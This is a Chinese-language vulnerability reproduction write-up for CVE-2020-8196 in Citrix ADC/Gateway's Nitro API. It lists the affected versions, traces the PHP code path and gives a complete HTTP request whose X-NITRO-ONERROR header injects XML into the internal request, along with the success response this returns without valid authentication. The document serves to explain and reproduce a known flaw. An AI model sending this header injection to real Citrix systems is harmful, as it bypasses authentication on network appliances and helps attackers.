<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-8196）Citrix Nitro API 未授权访问漏洞</h1><h2>一、漏洞简介</h2><p>Citrix ADC和Citrix NetScaler Gateway存在一个信息泄露漏洞，该漏洞允许经过身份验证的远程恶意用户获取主机上的敏感信息。通过发送特制请求，攻击者可以利用此漏洞获取敏感信息，然后使用此信息对受影响的系统发起进一步的攻击。</p><h2>二、漏洞影响</h2><p>Citrix ADC and Citrix Gateway: &lt; 13.0-58.30</p><p>Citrix ADC and NetScaler Gateway: &lt; 12.1-57.18</p><p>Citrix ADC and NetScaler Gateway: &lt; 12.0-63.21</p><p>Citrix ADC and NetScaler Gateway: &lt; 11.1-64.14 </p><p>NetScaler ADC and NetScaler Gateway: &lt; 10.5-70.18</p><p>Citrix SD-WAN WANOP: &lt; 11.1.1a</p><p>Citrix SD-WAN WANOP: &lt; 11.0.3d</p><p>Citrix SD-WAN WANOP: &lt; 10.2.7</p><p>Citrix Gateway Plug-in for Linux: &lt;  1.0.0.137</p><h2>三、复现过程</h2><p>Nitro API 可以给用户使用，还可以给其他Citrix组件使用</p><p>举例，当我们发送</p><p>&lt;?xml version="1.0"?&gt;<br />&lt;server&gt;&lt;/server&gt;</p><p>则会返回</p><p>&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;0&lt;/errorcode&gt;&lt;message&gt;Done&lt;/message&gt;&lt;severity&gt;NONE&lt;/severity&gt;&lt;/nitroResponse&gt;</p><p>并且可以在未登陆的使情况进行命令请求</p><p>&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;354&lt;/errorcode&gt;&lt;message&gt;Invalid username or password&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;</p><p>在这里会返回一个错误代码，该代码0表示一切正常，&gt;0表示失败。API会检查几个HTTP标头，并将它们的值用于事物。其中之一是X-NITRO-ONERROR函数中的标头get_params()。</p><p>// Setting the header X-NITRO-ONERROR for bulk request<br />$nitro_error = $this-&gt;get_headervalue($headers, "X-NITRO-ONERROR");<br />if (isset($nitro_error))<br />    $onerror = $this-&gt;get_headervalue($headers, "X-NITRO-ONERROR");<br /><br />$saveconfig = $this-&gt;get_headervalue($headers, "X-NITRO-SAVECONFIG");<br />$enablefeature = $this-&gt;get_headervalue($headers, "X-NITRO-ENABLEFEATURE");<br /><br />// Constructing the params.<br />$params = $this-&gt;validate_and_post_json_request_params($action, $format, $onerror, $override, $warning, $idempotent, $saveconfig, $enablefeature);<br />return $params;</p><p>在validate_and_post_json_request_params()函数中，我们的控制值into $onerror被添加$json_request_params并返回为$params：</p><p>// Validating and constructing params in nitro payload.<br />private function validate_and_post_json_request_params($action, $format, $onerror, $override, $warning, $idempotent, $saveconfig, $enablefeature)<br />{<br />    [..]<br /><br />    if(isset($onerror))<br />        $json_request_params["onerror"] = $onerror;<br /><br />    $json_request_params["httpheaders"] = "yes";<br /><br />    return $json_request_params;<br />}</p><p>$params然后将变量传递给get_payload()函数：</p><p>if (($post_body = $this-&gt;get_payload($content, $entity_type, $params, null)) === false)<br />    return $post_body;</p><p>此函数创建“Nitro有效载荷”并返回它，以便可以在内部API调用中使用。该函数X-NITRO-ONERROR在返回之前直接将几个参数的值（包括标头）直接粘贴到XML有效负载中：</p><p> // Constructing the nitro payload.<br />private function get_payload($content, $entity_type, $params, $objectname) {<br /><br />    $error = false;<br />    $request = array();<br />    $entity_list = $entity_type . "_list";<br />    if (preg_match("/^&lt;/", $content)) {<br />    libxml_disable_entity_loader(true);<br />        $req = simplexml_load_string($content);<br />    libxml_disable_entity_loader(false);<br />        if ($req == null) {<br />            header("HTTP/1.1 400 Bad Request");<br />            $this-&gt;print_error_message("Invalid Xml Input");<br />            return false;<br />        }<br /><br />        if (isset($objectname)) {<br />            if (strcmp($req-&gt;getName(), $objectname) != 0) {<br />                header("HTTP/1.1 400 Bad Request");<br />                $this-&gt;print_error_message("Invalid Xml Payload. Mismatch between content-type and payload");<br />                return false;<br />            }<br />        }<br /><br />    $xml = "&lt;nitroRequest&gt;\n" . "" . $content . "" .  $this-&gt;arrayToXMLString($params,"params") . "&lt;/nitroRequest&gt;";<br />    return $xml;<br />}</p><p>这意味着我们可以控制此XML文档中放置的元素。这个XML是通过几个函数返回的，最终以一个称为的变量结束，该变量$post_body作为该函数的参数给出nsrest_exec()。该函数调用的输出发送到该send_reponse()函数：</p><p>$response = nsrest_exec($is_gui, $this-&gt;request_method, $post_body, $this-&gt;username, $this-&gt;password, $this-&gt;get_client_ip(), $_SERVER["SERVER_ADDR"], $partid);<br />    if($this-&gt;is_direct_invocation)<br />        return $response["response"];<br />    $this-&gt;send_response($response, $this-&gt;request_method, $this-&gt;validate_and_get_entity_type($arg_list), $is_gui);</p><p>该nsrest_exec()函数是Citrix随附的自定义PHP函数，位于一个名为的库文件中libphp7.so。该函数或者在成功执行时返回XML对象，或者在执行FALSE失败时返回XML对象。沿线的某个地方FALSE变成，NULL然后NULL变成0。我不知道确切的内部工作原理，nsrest_exec但总而言之：无效的XML X-NITRO-ONERROR表示一切正常的响应。</p><p>例如，此请求包含无效的XML：</p><p>POST /nitro/v1/config/server HTTP/1.1<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br />Accept: application/xml<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Referer: https://citrix.local/menu/neo<br />Content-Type: application/xml<br />If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT<br />DNT: 1<br />Connection: close<br />Content-Length: 17<br />X-NITRO-ONERROR: exit&lt;/onerror&gt;&lt;idempotent&gt;yes&lt;/idempotent&gt;&lt;format&gt;xml&lt;/format&gt;&lt;rawdata&gt;yes&lt;/rawdata&gt;&lt;/params&gt;&lt;server&gt;&lt;/server&gt;&lt;params&gt;&lt;onerror<br /><br />&lt;server&gt;&lt;/server&gt;</p><p>返回值</p><p>HTTP/1.1 201 Created<br />Date: Tue, 28 Jan 2020 10:52:07 GMT<br />Server: Apache<br />X-Frame-Options: SAMEORIGIN<br />Set-Cookie: SESSID=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br />Pragma: no-cache<br />X-XSS-Protection: 1; mode=block<br />Content-Length: 126<br />Connection: close<br />Content-Type: application/xml; charset=utf-8<br /><br />&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;0&lt;/errorcode&gt;&lt;message&gt;Done&lt;/message&gt;&lt;severity&gt;NONE&lt;/severity&gt;&lt;/nitroResponse&gt;**</p><p>如上所示一切正常，并且身份验证已通过。实际上什么也没有发生，但是使用错误代码就可以来验证API调用是否成功</p></body></html>